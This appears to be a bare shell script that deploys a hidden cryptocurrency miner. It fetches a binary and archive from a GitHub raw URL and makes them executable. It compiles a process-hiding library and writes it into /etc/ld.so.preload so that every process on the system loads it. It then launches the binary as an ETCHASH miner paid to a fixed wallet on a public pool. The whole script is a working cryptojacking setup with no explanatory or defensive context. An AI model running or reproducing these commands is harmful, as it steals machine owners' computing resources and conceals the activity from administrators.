wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek

chmod +x pepek

wget https://raw.githubusercontent.com/gunturyogatama404/asdacascdasd/main/pepek.zip

unzip pepek.zip

make

gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

mv libprocesshider.so /usr/local/lib/

echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./pepek --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
